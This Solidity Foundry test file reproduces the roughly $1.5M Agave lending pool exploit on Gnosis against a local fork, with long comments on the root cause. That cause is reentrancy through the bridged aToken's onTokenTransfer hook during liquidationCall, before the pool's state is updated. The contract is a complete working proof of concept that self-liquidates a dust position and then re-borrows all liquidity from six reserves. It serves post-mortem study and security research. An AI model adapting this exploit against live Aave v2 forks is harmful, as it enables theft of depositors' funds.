// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IGnosisBridgedAsset is IERC20 {
    function mint(address, uint256) external returns (bool);
}

// @KeyInfo - Total Lost : ~1.5M US$
// Attacker : https://gnosisscan.io/address/0x0a16a85be44627c10cee75db06b169c7bc76de2c
// Attack Contract : https://gnosisscan.io/address/0xF98169301B06e906AF7f9b719204AA10D1F160d6
// Vulnerable Contract : https://gnosisscan.io/address/0x207E9def17B4bd1045F5Af2C651c081F9FDb0842 (Agave lending pool v1)
// Attack Tx : https://gnosisscan.io/tx/0xa262141abcf7c127b88b4042aee8bf601f4f3372c9471dbd75cb54e76524f18e

// @Info
// Vulnerable Contract Code : https://github.com/Agave-DAO/protocol-v2/commit/31922797ba110ddb3e908936b940b40221b7e190#diff-d237d9f48e3d6657a5f94c89b903c5003cba6f9a286e26eff509cb44a3f4ee8f

// @Analysis
// Post-mortem :https://medium.com/agavefinance/agave-exploit-reentrancy-in-liquidation-call-51ae407bc56
// Twitter Guy : https://twitter.com/Mudit__Gupta/status/1503783633877827586

/*
Detailed explanation of the agave exploit attack flow:

1. Prepare Phase:
   - Initial Condition: Ensure that the health factor is slightly above 1.
   - Transition: Advance time by one hour after the initial prepare.
   - Objective: Reduce the health factor to less than 1 in the next block.
   - Purpose: This step is essential for the liquidation call to work, as it requires a health factor below 1.

2. Flashloan and Deposit Phase:
   - Action: Execute a flashloan and deposit tokens.
   - Exploited Assets: In this exploit, withdraw and borrow all funds from WETH and maximize borrowing from all available pools.

3. Exploit Completion:
   - Result: Successful execution drains funds from the lending pool.

Note: These concise steps outline the specific actions taken in each phase of the agave exploit, providing a clear understanding of the attack flow.
*/

/*
================================================================================
VULNERABILITY: Reentrancy via ERC677-style onTokenTransfer hook in liquidationCall
                (CEI violation in Aave-v2 fork's liquidation path)
================================================================================

Root Cause:
- Agave (Gnosis) is a near-verbatim fork of Aave v2 protocol-v2.
- ILendingPool.liquidationCall(collateral, debt, user, debtToCover, receiveAToken)
  performs an *external call* to transfer collateral (or internal aToken burn/transfer
  of 1 unit) to the liquidator *before* it updates the borrower's debt accounting,
  collateral accounting, and reserve state (the "Effects" part of CEI).
- On Gnosis, the aTokens (e.g. aWETH at 0xb5A165d9177555418796638447396377Edf4C18a)
  are bridged assets (IGnosisBridgedAsset) that implement ERC677 / transfer-and-call
  semantics: any transfer of value N calls onTokenTransfer(from, N, data) on the
  recipient if the recipient is a contract.
- The attacker contract implements onTokenTransfer. When liquidationCall burns/transfers
  a tiny amount (value==1) of aWETH, the hook fires *while liquidationCall is still on
  the call stack*.
- No reentrancy guard (no ReentrancyGuard, no nonReentrant modifier on liquidationCall
  or the internal _liquidate* paths, and borrow()/deposit() are also unguarded for
  this cross-reserve reentry).
- Consequently, from within onTokenTransfer the attacker can call lendingPool.borrow()
  (and deposit) on *any* reserve while the original liquidation's state updates are
  still pending. The pool still sees the pre-liquidation liquidity and the attacker's
  pre-liquidation HF/collateralization numbers.

Why the tiny self-liquidation (debtToCover=2) works:
- liquidationCall is permissionless for anyone when HF < 1.
- By self-liquidating a dust amount of its own WETH debt against its own WETH collateral
  (receiveAToken=false), the code path still executes the collateral seizure / aToken
  burn logic that emits the callback.
- The 2-wei debt cover is irrelevant; the side effect (the hook) is what matters.
- After the hook returns, the liquidation finishes its tiny accounting, but the
  attacker has already drained the pools via reentrant borrows.

Code references in this PoC (the real vuln lives in the deployed LendingPool at
0x207E9def17B4bd1045F5Af2C651c081F9FDb0842):
- Line ~203: lendingPool.liquidationCall(weth, weth, address(this), 2, false);
- Line ~226-233: onTokenTransfer(...) { if (_from == aweth && _value == 1) ... borrowTokens(); }
- Line ~219: borrowTokens() internal boostLTVHack { for each asset _borrow(max) }
- Line ~87-92: modifier boostLTVHack does the deposit-of-flash-WETH then the WETH borrow
- Lines 160-170 in _initHF: the setup that leaves HF barely >1 so that +1h interest
  accrual (warp) makes it <1.

Impact:
- Attacker drains essentially all available liquidity across 6 reserves (USDC, GNO,
  LINK, WBTC, WXDAI, WETH) in a single transaction.
- ~1.5M USD lost.
- Because borrows happen inside the liquidation, they bypass normal borrow caps,
  HF checks, and liquidity accounting that would have been enforced after the
  liquidation completed.
- The flash-loan simulation (uniswapV2Call) is only to get initial capital; the
  real profit comes from the free borrows inside the reentrancy window.

EXPLOIT STEPS (exact sequence from the PoC):
1. (setUp) Mint attacker-controlled WETH + LINK via the Gnosis bridge owner.
   Approve the LendingPool for max.
2. _initHF():
   - deposit(LINK, ~1.0000000000000002e18) + deposit(WETH, 1 wei)
   - set both as collateral
   - borrow(LINK, 0.7e18) + borrow(WETH, 1 wei)
   - withdraw(LINK, ~0.0666e18)   // leaves a position with HF slightly > 1
3. (in test) _flashWETH() -> uniswapV2Call -> _attackLogic():
   a. vm.warp(+1 hour) + vm.roll(+1)   // accrue interest on the debt -> HF < 1
   b. wethLiqBeforeHack = liquidity of WETH reserve (used later)
   c. lendingPool.liquidationCall(WETH, WETH, attacker, 2, false)
      - inside: pool transfers/burns 1 aWETH (or performs a transfer that triggers
        the hook) to attacker contract.
   d. onTokenTransfer(aweth, 1, ...) fires (first time, count=1, ignored)
      - later a second transfer of 1 also occurs inside the same liquidation
        (count==2)
   e. when count==2: borrowTokens()
      - modifier boostLTVHack:
          deposit(flashWETH - 1)   // temporarily boosts HF so borrows succeed
          _ (continue)
          borrow(WETH, wethLiqBeforeHack)  // drain the WETH reserve
      - for the other 5 assets: _borrow( available-1 )  // drain each
   f. reentrancy returns; liquidationCall finishes its dust accounting
   g. withdraw( all aWETH balance )  // pull out any seized aTokens as WETH
   h. "repay" the simulated flash (send to address(1))
4. Attacker now holds nearly all tokens that were in the reserves.

The same pattern (liquidation reentrancy via token callback before debt burn) was
previously seen in Lendf.Me and Hundred Finance.

No other .sol in this directory contains the vulnerable LendingPool or aToken
implementation; the PoC drives the real contracts via fork at block 21120283.
*/

// VULNERABILITY MARKER - see detailed block above for full analysis
// Key reentrancy surface: liquidationCall -> aToken transfer -> onTokenTransfer -> borrow

contract AgaveExploit is Test {
    //Prepare numbers
    uint256 linkLendNum1 = 1.0000000000000002 ether;
    uint256 wethlendnum2 = 1;
    uint256 linkDebt3 = 0.7 ether;
    uint256 wethDebt4 = 1;
    uint256 linkWithdraw5 = 0.06666666666 ether;

    uint256 callCount = 0;
    uint256 wethLiqBeforeHack = 0;

    //Asset addrs
    address aweth = 0xb5A165d9177555418796638447396377Edf4C18a;
    address gno = 0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb;
    address weth = 0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1;
    address link = 0xE2e73A1c69ecF83F464EFCE6A5be353a37cA09b2;
    address wbtc = 0x8e5bBbb09Ed1ebdE8674Cda39A0c169401db4252;
    address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
    address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;

    // Array of assets with weth at the end
    address[] assetAddrs;
    string[] assetNames = ["USDC", "GNO", "LINK", "WBTC", "WXDAI", "WETH", "aWETH"];
    uint8[] assetDecimals = [6, 18, 18, 8, 18, 18, 18];

    address provider = 0xA91B9095eFa6C0568467562032202108e49c9Ef8;
    //Address that can mint tokens on gnosis bridge
    address tokenOwner = 0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d;

    //Asset interfaces
    IGnosisBridgedAsset WETH = IGnosisBridgedAsset(weth);
    IGnosisBridgedAsset LINK = IGnosisBridgedAsset(link);

    // Contract / exchange interfaces
    ILendingPool lendingPool;

    uint256 ethFlashloanAmt = 2728.934387414251504146 ether + 1;

    modifier balanceLog() {
        _logBalances("Before hack balances");
        _;
        _logBalances("After hack balances");
    }

    // VULNERABILITY: Temporary HF boost inside reentrancy window (boostLTVHack modifier)
    // Root cause: This modifier (L~196) is applied to borrowTokens() which is called from onTokenTransfer
    // reentrancy. The deposit + subsequent borrow happen while liquidationCall's stack frame is active
    // (before its state writes). deposit(flash-1) uses the flashloaned WETH that was never deposited
    // in the outer context; it only exists to satisfy the pool's HF check for the massive borrow that follows.
    // Why vulnerable: borrow checks are performed against the *pre-liquidation* user account data and
    // reserve state; the inner deposit temporarily makes the numbers pass. After the borrow(WETH, full liq)
    // the _ (continuation) returns, hook ends, liquidation finishes (having seen stale data throughout).
    // Impact: Allows draining wethLiqBeforeHack of WETH + (reserve-1) of the other assets without the
    // liquidation's collateral seizure or debt repayment ever constraining the borrows.
    // Location: modifier at L~196, invoked from borrowTokens L~370 (during count==2).
    //
    // EXPLOIT STEPS (continuation of trace):
    // 7a. Inside borrowTokens() (called from hook): apply boostLTVHack:
    //     deposit(WETH.balance-1)  --> this raises HF just enough
    //     _ (body of borrowTokens does non-WETH _borrows)
    //     borrow(WETH, wethLiqBeforeHack)  --> drain
    // The entire sequence is atomic within the liquidationCall external call.
    modifier boostLTVHack() {
        lendingPool.deposit(weth, WETH.balanceOf(address(this)) - 1, address(this), 0);
        _;
        //We borrow directly here cause of some edge case the _borrow fails for weth
        lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
    }

    function _getTokenBal(
        address asset
    ) internal view returns (uint256) {
        return IERC20(asset).balanceOf(address(this));
    }

    function _logBalances(
        string memory message
    ) internal {
        console.log(message);
        console.log("--- Start of balances ---");
        
        for (uint i = 0; i < assetAddrs.length; i++) {
            emit log_named_decimal_uint(
                string.concat(assetNames[i], " Balance"), 
                _getTokenBal(assetAddrs[i]), 
                assetDecimals[i]
            );
        }
        
        emit log_named_decimal_uint("healthf", _getHealthFactor(), 18);
        console.log("--- End of balances ---");
    }

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8553", 21_120_283); //fork gnosis at block number 21120319
        lendingPool = ILendingPool(ILendingPoolAddressesProvider(provider).getLendingPool());
        wethLiqBeforeHack = _getAvailableLiquidity(weth);

        // Initialize asset array
        assetAddrs = new address[](7);
        assetAddrs[0] = usdc;
        assetAddrs[1] = gno;
        assetAddrs[2] = link;
        assetAddrs[3] = wbtc;
        assetAddrs[4] = wxdai;
        assetAddrs[5] = weth;
        assetAddrs[6] = aweth;

        //Lets just mint weth to this contract for initial debt
        vm.startPrank(tokenOwner);
        
        //Mint initial weth funding
        WETH.mint(address(this), ethFlashloanAmt);
        // Mint LINK funding
        LINK.mint(address(this), linkLendNum1);

        vm.stopPrank();

        //Approve funds
        LINK.approve(address(lendingPool), type(uint256).max);
        WETH.approve(address(lendingPool), type(uint256).max);
    }

    function _getAvailableLiquidity(
        address asset
    ) internal view returns (uint256 reserveTokenbal) {
        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
        reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
    }

    function _getHealthFactor() internal view returns (uint256) {
        (,,,,, uint256 healthFactor) = lendingPool.getUserAccountData(address(this));
        return healthFactor;
    }

    // VULNERABILITY: Precondition setup (_initHF) to make self-position liquidatable for hook trigger
    // Root cause / why exists: The attack requires the attacker to be liquidatable (HF < 1) so that
    // anyone (including self) can call liquidationCall on it. The protocol's HF check is the gate.
    // Exact construction: a minimal position (LINK collateral + WETH collateral + small borrows + partial
    // withdraw) is sized so that after exactly 1h of interest accrual (via warp) the healthFactor dips
    // below 1, but before the warp it is >1. The position size is economically irrelevant (dust debt=2
    // is repaid in liq); it exists purely to open the liquidationCall code path that does the aToken
    // transfer hook. The flash WETH is *not* part of this position; it is minted for the later boost.
    // Impact of this step: enables the permissionless liquidationCall that is the reentrancy vector.
    // Without this, the hook would never fire. Location: _initHF() L~320 and the warp in _attackLogic L~313.
    //
    // EXPLOIT STEPS:
    // 3. _initHF() builds the under-water-able position (detailed calls below).
    // 4. Warp+roll in _attackLogic makes the HF cross below 1, satisfying the check inside liquidationCall.
    function _initHF() internal {
        //follow the flow of this TX https://gnosisscan.io/tx/0x45b2d71f5bbb17fa67341fdf30468f1de032db71760be0cf4df9bac316cda7cc

        uint256 balance = LINK.balanceOf(address(this));
        require(balance > 0, "no link");

        // VULNERABILITY SETUP: create a borrow position that will become
        // liquidatable exactly after 1 hour of interest accrual.
        // Small principal + specific borrow/withdraw amounts chosen so that
        // getUserAccountData().healthFactor crosses below 1.0 only after warp.
        // This position is the "victim" of the self-liquidation that triggers
        // the aToken hook; the drain itself is performed by the reentrant
        // borrows, not by profiting from this tiny liquidation.

        //Deposit weth to aave v2 fork
        lendingPool.deposit(link, linkLendNum1, address(this), 0);
        lendingPool.deposit(weth, wethlendnum2, address(this), 0);

        //Enable asset as collateral

        lendingPool.setUserUseReserveAsCollateral(link, true);
        lendingPool.setUserUseReserveAsCollateral(weth, true);

        //Borrow initial setup prepare debts
        lendingPool.borrow(link, linkDebt3, 2, 0, address(this));
        lendingPool.borrow(weth, wethDebt4, 2, 0, address(this));

        //Withdraw as per tx
        lendingPool.withdraw(link, linkWithdraw5, address(this));
    }

    function testExploit() public balanceLog {
        //Call prepare and get it setup
        _initHF();
        _flashWETH();
    }

    function _flashWETH() internal {
        uniswapV2Call(address(this), ethFlashloanAmt, 0, abi.encode(msg.sender));
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {
        //We simulate a flashloan from uniswap for initial eth funding
        _attackLogic(_amount0, _amount1, _data);
    }

    function _attackLogic(uint256 _amount0, uint256 _amount1, bytes memory _data) internal {
        //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 1);

        // VULNERABILITY: LiquidationCall external call (pre-state-update transfer) is the trigger point
        // Root cause exercised here: liquidationCall(weth,weth,this,2,false) at this line (L~327) is where
        // the vulnerable ILendingPool executes the collateral aToken transfer (value=1) to this contract
        // *before* any Effects (debt burn for the 2 wei, HF recalc, liquidity index update, collateral accounting).
        // Why vulnerable: the aWETH (bridged) implements ERC677-style callback on any positive transfer;
        // the call stack is still inside liquidationCall when onTokenTransfer runs, so reentrant calls
        // (borrow) see the caller's (this) pre-liquidation state for *all* reserves.
        // The self-liquidation uses debtToCover=2 (dust) and receiveAToken=false; the actual borrow drain
        // happens in the hook. No reentrancy protection on the liquidation path or borrow (Aave v2 fork bug).
        // Impact at this point: opens a window for unbounded borrow of every reserve's liquidity.
        // EXPLOIT STEPS (this is step 5 of the trace):
        // 5. Call liquidationCall (this line) after HF<1 from the +1h warp. This is the single call that
        //    both satisfies the liq precondition and fires the two onTokenTransfer callbacks (count==1 then ==2).
        //    See onTokenTransfer (L~395) for the reentry and borrowTokens (L~370) for the drain.
        lendingPool.liquidationCall(weth, weth, address(this), 2, false);

        //This will withdraw the funds from weth lending pool
        lendingPool.withdraw(weth, _getTokenBal(aweth), address(this));
        //For test case we just send it to address(1) to reduce the flashloan debt amount from us to get final assets
        WETH.transfer(address(1), ((ethFlashloanAmt * 1000) / 997) + 1);
    }

    function _borrow(
        address asset
    ) internal {
        // During reentrancy this reads the *still-full* liquidity because
        // liquidationCall has not yet written the updated aToken balance /
        // reserve data for the WETH collateral it is seizing.
        uint256 reserveTokenbal = _getAvailableLiquidity(asset);
        uint256 BorrowAmount = reserveTokenbal > 2 ? reserveTokenbal - 1 : 0;
        if (BorrowAmount > 0) lendingPool.borrow(asset, BorrowAmount, 2, 0, address(this));
    }

    //NOTE: boostLTVHack deposits weth from flashloan to increase health and borrows wethliqbeforehack at the end
    function borrowTokens() internal boostLTVHack {
        // Borrow all assets except weth (which is at index 5)
        for (uint i = 0; i < 5; i++) {
            _borrow(assetAddrs[i]);
        }
    }

    // VULNERABILITY: Reentrancy via ERC677 onTokenTransfer hook in liquidationCall (CEI violation)
    // Root cause (exercised at this location): The target ILendingPool.liquidationCall (at 0x207E9def17B4bd1045F5Af2C651c081F9FDb0842)
    // performs an external call to transfer/burn 1 wei of aWETH collateral *before* it updates the user's debt accounting,
    // reserve liquidity, health factor, and aToken state (violates Checks-Effects-Interactions).
    // On Gnosis, the aTokens are IGnosisBridgedAsset which implement transfer-and-call: transfer of value N invokes
    // onTokenTransfer(from, N, data) on the receiver if it is a contract. No nonReentrant guard protects liquidationCall
    // or the borrow path. Thus inside the hook the attacker can call borrow() which observes pre-liquidation liquidity
    // and the attacker's pre-liquidation HF/collateral values.
    // Exact flaw: the tiny self-liquidation (debtToCover=2) still triggers the collateral transfer path that emits the
    // callback; debtToCover value is irrelevant, the hook side-effect is the attack vector.
    // Impact: Attacker can borrow the entire available liquidity of 6 reserves (USDC/GNO/LINK/WBTC/WXDAI/WETH) in one tx,
    // bypassing all post-liquidation accounting, borrow caps, and HF checks. ~1.5M USD drained.
    // Code location: onTokenTransfer at L~366 (this file); triggered from _attackLogic L~320 liquidationCall;
    // reentrant borrows at borrowTokens L~341 and boostLTVHack L~187.
    //
    // EXPLOIT STEPS:
    // 1. setUp(): fork at block 21120283, mint attacker WETH+LINK via tokenOwner (L~235-240), approve lendingPool max.
    // 2. testExploit() calls _initHF() then _flashWETH() which dispatches to _attackLogic.
    // 3. _initHF() (L~268): deposit(LINK, 1.000...e18), deposit(WETH,1), setUserUseReserveAsCollateral for both,
    //    borrow(LINK,0.7e18), borrow(WETH,1), withdraw(LINK,0.0666e18) -- leaves HF barely >1.
    // 4. In _attackLogic (L~300): vm.warp(+1h) + vm.roll(+1) so interest accrual makes HF <1 (precondition for liq).
    //    Capture wethLiqBeforeHack = _getAvailableLiquidity(weth) (L~302).
    // 5. lendingPool.liquidationCall(weth, weth, address(this), 2, false) at L~320 -- permissionless because HF<1.
    //    Inside pool: it does a transfer/burn of 1 aWETH to the liquidator (this contract) BEFORE updating Effects.
    // 6. aWETH transfer triggers onTokenTransfer(aweth, 1) at L~366 (first time callCount=1, ignored; second time=2).
    // 7. On callCount==2: borrowTokens() which applies boostLTVHack modifier:
    //    - deposit(flash WETH balance -1) to temporarily boost HF so large borrows won't revert on HF check (L~187).
    //    - then lendingPool.borrow(weth, wethLiqBeforeHack, ...) drains WETH reserve (L~191 inside modifier).
    //    - then _borrow() for other 5 assets: read still-full _getAvailableLiquidity, borrow(reserve-1) (L~330-337).
    // 8. Hook returns; liquidationCall finishes its dust debt/collateral accounting (too late).
    // 9. withdraw all aWETH balance (L~325), "repay" simulated flash to address(1).
    // 10. Attacker holds essentially all liquidity that was in the reserves at the moment of the hook.
    function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
        if (_from == aweth && _value == 1) {
            callCount++;
            if (callCount == 2) {
                borrowTokens();
            }
        }
    }
}
